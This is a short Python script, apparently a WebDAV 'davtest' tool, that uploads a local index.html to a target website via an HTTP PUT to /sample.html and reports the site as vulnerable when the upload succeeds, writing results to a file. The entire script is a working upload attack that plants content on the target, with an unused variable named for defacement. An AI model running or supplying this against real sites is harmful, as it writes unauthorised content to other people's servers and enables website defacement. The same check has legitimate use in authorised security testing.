#!/usr/bin/python3

try:
   import requests
   import os.path
   import sys
   import os
except ImportError:
   exit("install requests and try again ...")


b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def aox(script, site):
   dface = "/"+script

   op = open(script,"r").read()

   s = requests.Session()

   try:
      site = site.strip()
      if site.startswith("http://") is False:
         site = "http://" + site

      req = s.put(site+"/"+"sample.html", data=op)

      if req.status_code < 200 or req.status_code >= 250:
        print("\n[+] The website is not vulnerable to WebDAV !\n")                                                                                  
        file.write("[+] The domain is not vulnerable to WebDAV!\n")                                                                                 
                                                                                                                                                                      
      else:                                                                                                                                                           
        invisible = site + "/sample.html"                                                                                                                             
        print("\n[+] The website is vulnerable to WebDAV !\n[+] {}\n".format(invisible))                                                                              
        file.write("\n[+] The site {} is vulnerable to WebDAV\n\n".format(invisible))                                                                                 
                                                                                                                                                                      
   except requests.exceptions.RequestException:
       print("some error!!")

a = "index.html"

try:
 file = open(sys.argv[2],'w')
 site = sys.argv[1]
except:
 print("\n[+] Usage : davtest [url] [output-file]\n")
 exit()

aox(a, site)

file.close()
